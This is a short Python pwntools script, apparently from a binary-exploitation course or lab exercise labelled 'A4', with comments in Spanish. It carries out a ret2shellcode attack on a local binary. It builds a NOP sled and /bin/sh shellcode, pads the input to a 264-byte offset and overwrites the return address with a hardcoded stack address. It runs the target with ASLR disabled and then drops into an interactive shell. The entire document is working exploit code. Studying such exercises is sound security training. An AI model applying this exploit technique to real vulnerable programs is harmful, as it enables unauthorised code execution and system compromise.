#!/usr/bin/env python3
# A4: ret2shellcode con NOP sled
from pwn import context, process, shellcraft, asm, p64
context.binary = "./bin/a4"
OFFSET = 264
SLED = 200
shellcode = asm(shellcraft.amd64.linux.sh())
# Direccion dentro del sled (ajustar a tu maquina; ASLR off):
STACK_ADDR = 0x7fffffffe300
payload  = b"\x90" * SLED + shellcode
payload += b"A" * (OFFSET - len(payload))
payload += p64(STACK_ADDR + 50)
io = process(["setarch", "x86_64", "-R", "./bin/a4"])
io.sendline(payload)
io.interactive()
